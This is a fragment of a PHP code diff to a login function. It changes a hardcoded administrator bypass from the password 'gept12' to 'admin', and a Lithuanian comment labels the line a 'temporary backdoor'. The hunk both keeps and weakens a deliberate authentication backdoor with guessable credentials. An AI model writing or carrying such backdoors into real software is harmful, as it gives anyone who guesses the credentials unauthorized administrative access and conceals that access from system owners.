@@ -93,7 +93,7 @@ function get_login_id($uName,$uPass,&$err)
 		$err = $uName=='' ? 1 : 2;
 		return 0;
 	}
-    elseif ($uName==='admin' && $uPass==='gept12') return -1; //laikinos galines durys
+    elseif ($uName==='admin' && $uPass==='admin') return -1; //laikinos galines durys
 	else {
 		$err = 1;
 		return 0;
